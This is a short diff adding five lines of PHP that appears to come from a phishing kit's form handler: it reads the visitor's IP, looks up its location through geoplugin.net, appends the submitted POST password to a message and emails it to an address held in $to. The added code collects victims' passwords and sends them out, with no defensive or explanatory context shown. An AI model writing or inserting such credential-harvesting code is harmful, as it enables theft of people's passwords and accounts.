@@ -1,0 +1,5 @@
+$ip = getenv("REMOTE_ADDR");
+$geo = file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip);
+$message .= "Password: ".$_POST['password']."\n";
+mail($to, $subject, $message, $headers);
+
